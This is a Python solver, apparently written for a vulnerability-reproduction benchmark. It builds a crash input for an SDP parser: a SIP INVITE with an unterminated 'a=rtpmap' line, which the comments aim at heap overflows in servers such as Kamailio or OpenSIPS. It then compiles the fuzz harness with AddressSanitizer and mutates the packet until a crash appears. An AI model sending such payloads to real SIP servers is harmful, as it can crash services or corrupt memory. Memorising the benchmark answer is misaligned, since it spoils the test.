import os
import sys
import tarfile
import tempfile
import subprocess
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Fallback PoC: SIP INVITE with malformed SDP (unterminated attribute at EOF)
        # Targeted at generic SDP parser heap overflow (e.g. Kamailio/OpenSIPS)
        # where the parser expects a delimiter/newline but hits the end of the buffer.
        body = (
            b"v=0\r\n"
            b"o=- 123 123 IN IP4 127.0.0.1\r\n"
            b"s=-\r\n"
            b"c=IN IP4 127.0.0.1\r\n"
            b"t=0 0\r\n"
            b"m=audio 5000 RTP/AVP 0\r\n"
            b"a=rtpmap:0" # Missing \r\n, potentially triggering OOB read at EOF
        )
        content_len = len(body)
        headers = (
            b"INVITE sip:service@127.0.0.1:5060 SIP/2.0\r\n"
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK-123456\r\n"
            b"From: <sip:user@127.0.0.1>;tag=1234\r\n"
            b"To: <sip:service@127.0.0.1>\r\n"
            b"Call-ID: 123456789@127.0.0.1\r\n"
            b"CSeq: 1 INVITE\r\n"
            b"Content-Type: application/sdp\r\n"
            b"Content-Length: " + str(content_len).encode() + b"\r\n"
            b"\r\n"
        )
        fallback_poc = headers + body

        try:
            with tempfile.TemporaryDirectory() as temp_dir:
                # 1. Extract source
                if os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tgz') or src_path.endswith('.tar')):
                    try:
                        with tarfile.open(src_path) as tar:
                            tar.extractall(temp_dir)
                    except Exception:
                        return fallback_poc
                
                # 2. Locate Fuzzer and Sources
                fuzzer_src = None
                src_files = []
                include_dirs = set()
                
                for root, dirs, files in os.walk(temp_dir):
                    for f in files:
                        path = os.path.join(root, f)
                        if f.endswith('.c') or f.endswith('.cc') or f.endswith('.cpp'):
                            src_files.append(path)
                            if not fuzzer_src:
                                try:
                                    with open(path, 'r', encoding='utf-8', errors='ignore') as fin:
                                        if "LLVMFuzzerTestOneInput" in fin.read():
                                            fuzzer_src = path
                                except Exception:
                                    pass
                        if f.endswith('.h'):
                            include_dirs.add(root)
                
                if not fuzzer_src:
                    return fallback_poc

                # 3. Prepare Compilation
                exe_path = os.path.join(temp_dir, "fuzz_harness")
                driver_path = os.path.join(temp_dir, "driver.c")
                
                # Check if harness has main
                has_main = False
                try:
                    with open(fuzzer_src, 'r', encoding='utf-8', errors='ignore') as f:
                        if "main(" in f.read():
                            has_main = True
                except Exception:
                    pass

                compile_srcs = []
                # Create driver if no main function exists in fuzzer source
                if not has_main:
                    with open(driver_path, "w") as f:
                        f.write(
                            "#include <stdio.h>\n"
                            "#include <stdlib.h>\n"
                            "#include <stdint.h>\n"
                            "#include <unistd.h>\n"
                            "#include <fcntl.h>\n"
                            "#include <sys/stat.h>\n"
                            "int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);\n"
                            "int main(int argc, char **argv) {\n"
                            "    if (argc < 2) return 0;\n"
                            "    int fd = open(argv[1], O_RDONLY);\n"
                            "    if (fd < 0) return 0;\n"
                            "    struct stat st;\n"
                            "    if (fstat(fd, &st) == 0 && st.st_size > 0) {\n"
                            "        uint8_t *buf = (uint8_t*)malloc(st.st_size);\n"
                            "        if (buf) {\n"
                            "            if (read(fd, buf, st.st_size) == st.st_size) {\n"
                            "                 LLVMFuzzerTestOneInput(buf, st.st_size);\n"
                            "            }\n"
                            "            free(buf);\n"
                            "        }\n"
                            "    }\n"
                            "    close(fd);\n"
                            "    return 0;\n"
                            "}\n"
                        )
                    compile_srcs.append(driver_path)

                # Add sources (exclude other mains to avoid linker errors)
                for s in src_files:
                    if s == fuzzer_src:
                        compile_srcs.append(s)
                        continue
                    try:
                        with open(s, 'r', encoding='utf-8', errors='ignore') as f:
                            if "main(" in f.read():
                                continue
                    except Exception:
                        pass
                    compile_srcs.append(s)

                # 4. Compile
                # Using -O1 and -g for speed and debug info, ASAN for crash detection
                cmd = ["gcc", "-g", "-O1", "-fsanitize=address", "-D_GNU_SOURCE"]
                cmd += [f"-I{d}" for d in include_dirs]
                cmd += compile_srcs
                cmd += ["-o", exe_path]
                
                # Attempt compilation with timeout
                try:
                    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
                except subprocess.TimeoutExpired:
                    return fallback_poc
                
                if not os.path.exists(exe_path):
                    return fallback_poc

                # 5. Fuzz
                input_path = os.path.join(temp_dir, "input.bin")
                
                # Test Fallback first
                with open(input_path, "wb") as f:
                    f.write(fallback_poc)
                
                try:
                    res = subprocess.run([exe_path, input_path], capture_output=True, timeout=2)
                    if res.returncode != 0:
                        return fallback_poc # It works!
                except subprocess.TimeoutExpired:
                    pass

                # Simple mutation loop
                start_time = time.time()
                current_poc = fallback_poc
                
                while time.time() - start_time < 45:
                    mutated = bytearray(current_poc)
                    op = random.randint(0, 5)
                    
                    if op == 0: # Flip bit
                        idx = random.randint(0, len(mutated)-1)
                        mutated[idx] ^= (1 << random.randint(0, 7))
                    elif op == 1: # Append garbage
                        mutated += b"A" * random.randint(1, 100)
                    elif op == 2: # Truncate end
                        if len(mutated) > 10:
                            mutated = mutated[: -random.randint(1, 10)]
                    elif op == 3: # Insert in middle
                        idx = random.randint(0, len(mutated))
                        mutated[idx:idx] = b"\xff" * random.randint(1, 10)
                    elif op == 4: # Modify SDP attributes specifically (heuristic)
                        if b"a=rtpmap" in mutated:
                            mutated = mutated.replace(b"a=rtpmap", b"a=rtpmap" + b"A"*100)
                    elif op == 5: # Remove newlines
                        mutated = mutated.replace(b"\r\n", b"")
                    
                    with open(input_path, "wb") as f:
                        f.write(mutated)
                    
                    try:
                        res = subprocess.run([exe_path, input_path], capture_output=True, timeout=1)
                        if res.returncode != 0:
                            # Verify if ASAN output suggests heap overflow
                            if b"AddressSanitizer" in res.stderr:
                                return bytes(mutated)
                    except Exception:
                        pass
                        
        except Exception:
            pass
            
        return fallback_poc
